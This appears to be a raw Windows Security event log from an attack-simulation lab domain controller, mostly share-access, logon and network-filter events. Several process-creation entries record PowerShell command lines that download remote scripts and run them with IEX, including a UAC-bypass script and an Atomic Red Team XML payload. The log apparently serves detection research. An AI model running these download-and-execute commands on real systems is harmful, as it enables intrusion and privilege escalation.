03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382204
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	\

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382203
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	\

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382202
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	\

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382201
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382200
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382199
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382198
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382197
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382196
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382195
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382194
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382193
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator\Documents

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382192
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator\Documents

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382191
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator\Documents

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382190
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator\Documents

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382189
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator\Documents

Access Request Information:
	Access Mask:		0x100081
	Accesses:		SYNCHRONIZE
				ReadData (or ListDirectory)
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5140
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=File Share
OpCode=Info
RecordNumber=1382188
Keywords=Audit Success
Message=A network share object was accessed.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\

Access Request Information:
	Access Mask:		0x1
	Accesses:		ReadData (or ListDirectory)
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382187
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x4FE3D6B

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382186
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x4FE3D6B
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{08660350-345C-DC9E-6370-9808B2DB6D2D}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	fe80::6167:9038:1edc:47d4
	Source Port:		55125

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382185
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x4FE3D6B

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382184
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		852
	Application Name:	\device\harddiskvolume1\windows\system32\lsass.exe

Network Information:
	Direction:		Inbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55125
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382183
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2724
	Application Name:	\device\harddiskvolume1\windows\system32\dfssvc.exe

Network Information:
	Direction:		Outbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55125
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382182
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2724
	Application Name:	\device\harddiskvolume1\windows\system32\dfssvc.exe

Network Information:
	Source Address:		::
	Source Port:		55125
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5140
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=File Share
OpCode=Info
RecordNumber=1382181
Keywords=Audit Success
Message=A network share object was accessed.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\IPC$
	Share Path:		

Access Request Information:
	Access Mask:		0x1
	Accesses:		ReadData (or ListDirectory)
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382180
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		55124
	Destination Address:	::1
	Destination Port:		445
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382179
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		55124
	Destination Address:	::1
	Destination Port:		445
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382178
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Source Address:		::
	Source Port:		55124
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382217
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		8860
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55126
	Destination Address:	185.199.110.133
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382216
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		8860
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55126
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382215
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59598
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382214
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x229c
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x22b0
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	Powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382213
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x22b0
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382212
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1014
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:53:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382211
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		63816
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382227
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2220
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1c8c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382226
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1c8c
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

